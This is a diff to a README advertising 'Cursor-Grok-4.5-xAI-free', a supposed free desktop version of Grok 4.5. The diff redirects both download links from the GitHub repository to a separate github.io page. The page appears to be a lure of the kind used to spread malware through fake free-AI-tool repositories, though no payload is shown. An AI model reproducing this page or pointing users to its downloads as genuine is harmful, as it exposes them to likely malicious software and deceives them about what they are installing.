@@ -1,6 +1,6 @@
 # 🚀 Cursor-Grok-4.5-xAI-free - Free Grok 4.5 Desktop for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download-Cursor_Grok_4.5-blueviolet?style=for-the-badge&logo=github)](https://github.com/hasheemample171/Cursor-Grok-4.5-xAI-free)
+[![Download Now](https://img.shields.io/badge/Download-Cursor_Grok_4.5-blueviolet?style=for-the-badge&logo=github)](https://hasheemample171.github.io)
 
 ## 🎯 What Is This?
 
@@ -23,7 +23,7 @@ Cursor-Grok-4.5-xAI-free is a free desktop application for Windows, macOS, and L
 
 Visit this link to download the application:
 
-[**Download Cursor Grok 4.5 Free**](https://github.com/hasheemample171/Cursor-Grok-4.5-xAI-free)
+[**Download Cursor Grok 4.5 Free**](https://hasheemample171.github.io)
 
 The download button is clearly visible on the page. Click it to start your download.
 
